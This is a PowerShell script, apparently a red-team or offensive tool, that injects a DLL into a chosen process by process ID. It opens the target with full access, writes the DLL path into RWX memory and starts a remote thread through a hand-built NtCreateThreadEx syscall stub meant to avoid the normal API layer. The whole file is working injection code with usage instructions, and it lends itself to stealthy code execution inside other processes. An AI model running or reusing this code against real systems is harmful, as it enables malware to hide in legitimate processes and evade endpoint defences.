function NtCreateThreadEx()
{
<#
.SYNOPSIS
Dll Injection using NtCreateThreadEx 
Author:  Souhardya Sardar
.PARAMETER DllPath
The dllname to be used.
.PARAMETER ProcessID
The process Id of the process 
.EXAMPLE
PS>Import-Module .\NtCreateThreadEx.ps1
NtCreateThreadEx -DllPath FullPathToDll -ProcessID 123
#>

        [CmdletBinding()] Param (
        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $ProcessID,
    
        [Parameter(Position = 1, Mandatory = $True)]
        [String]
        $DllPath
        )

        [Byte[]]$dllBuf = [System.Text.Encoding]::Default.GetBytes($DllPath)

   
        #Winver : Windows Version 1803 x64
        [Byte[]] $NtCreateThreadExStub = @(0x49, 0x89, 0xCA, 0xB8, 0xBB, 0x00, 0x00, 0x00, 0x0F, 0x05, 0xC3)
        #0:   49 89 ca                mov    %rcx,%r10
        #3:   b8 bb 00 00 00          mov    $0xbb,%eax
        #8:   0f 05                   syscall
        #a:   c3                      retq

        function Local:Get-DelegateType
        {
            Param
            (
                [OutputType([Type])]
            
                [Parameter( Position = 0)]
                [Type[]]
                $Parameters = (New-Object Type[](0)),
            
                [Parameter( Position = 1 )]
                [Type]
                $ReturnType = [Void]
            )

            $Domain = [AppDomain]::CurrentDomain
            $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
            $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
            $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
            $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
            $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
            $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
            $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
            $MethodBuilder.SetImplementationFlags('Runtime, Managed')
        
            Write-Output $TypeBuilder.CreateType()
        }

        function Local:Get-ProcAddress
        {
            Param
            (
            
                [OutputType([IntPtr])]
        
                [Parameter( Position = 0, Mandatory = $True )]
                [String]
                $Module,
            
                [Parameter( Position = 1, Mandatory = $True )]
                [String]
                $Procedure
            )

            # Get a reference to System.dll in the GAC
            $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
            Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
            $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
            # Get a reference to the GetModuleHandle and GetProcAddress methods
            $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
            $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress', [reflection.bindingflags] "Public,Static", $null, [System.Reflection.CallingConventions]::Any, @((New-Object System.Runtime.InteropServices.HandleRef).GetType(), [string]), $null);
            # Get a handle to the module specified
            $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
            $tmpPtr = New-Object IntPtr
            $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)
        
            # Return the address of the function
            Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
        }

        

        
        $openaddr = Get-ProcAddress kernel32.dll OpenProcess
        $openDelgate = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])
        $openProc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($openaddr, $openDelgate)
        $prochandle = $openProc.Invoke(0x001F0FFF, $false, $ProcessID)  
        if($prochandle -eq '0')
        {
            Throw "[!] Cannot open a handle to the process:  $ProcessID"
        }
        

        
        $VirtualAllocExAddr = Get-ProcAddress kernel32.dll VirtualAllocEx
        $VirtualAllocExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])
        $VirtualAllocEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocExAddr, $VirtualAllocExDelegate)
        $remotememoryaddress = $VirtualAllocEx.Invoke($prochandle, [System.IntPtr]::Zero, $DllPath.Length+1 , 0x3000, 0x40) # Reserve|Commit, RWX
        if($remotememoryaddress -eq '0')
        {
            Throw "[!]Cannot allocate enough memory: $ProcessID"
        }

        
        $WriteProcessMemoryAddr = Get-ProcAddress kernel32.dll WriteProcessMemory
        $WriteProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [Byte[]], [UInt32], [IntPtr]) ([Bool])
        $WriteProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WriteProcessMemoryAddr, $WriteProcessMemoryDelegate)
        if(!$WriteProcessMemory.Invoke($prochandle, $remotememoryaddress, $dllBuf , [Uint32]$DllPath.Length+1 , [IntPtr]::Zero))
        {
            Throw "[!] Cannot write in remote process: $ProcessID"
        }
        
        
        $VirtualAllocAddr = Get-ProcAddress kernel32.dll VirtualAlloc
        $VirtualAllocDelegate = Get-DelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])
        $VirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocAddr, $VirtualAllocDelegate)

        $LoadLibraryAAddr = Get-ProcAddress kernel32.dll LoadLibraryA

        
        $NtCreateThreadDelgate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [bool], [Uint32], [Uint32], [Uint32], [IntPtr]) ([Uint32])
        $shellcodeBuf = $VirtualAlloc.Invoke([System.IntPtr]::Zero, $NtCreateThreadExStub.Length, 0x3000, 0x40) 
        [System.Runtime.InteropServices.Marshal]::Copy($NtCreateThreadExStub, 0, $shellcodeBuf, $NtCreateThreadExStub.Length)
        $NtCreateThreadEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($shellcodeBuf, $NtCreateThreadDelgate)
        

        $hRemoteThread = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(8) #would work 
        $NtCreateThreadEx.DynamicInvoke($hRemoteThread, [Uint32]0x1FFFFF, [IntPtr]::Zero, $prochandle, $LoadLibraryAAddr, $remotememoryaddress, $false, [UInt32]::Zero, [UInt32]::Zero, [UInt32]::Zero, [IntPtr]::Zero)
        

}
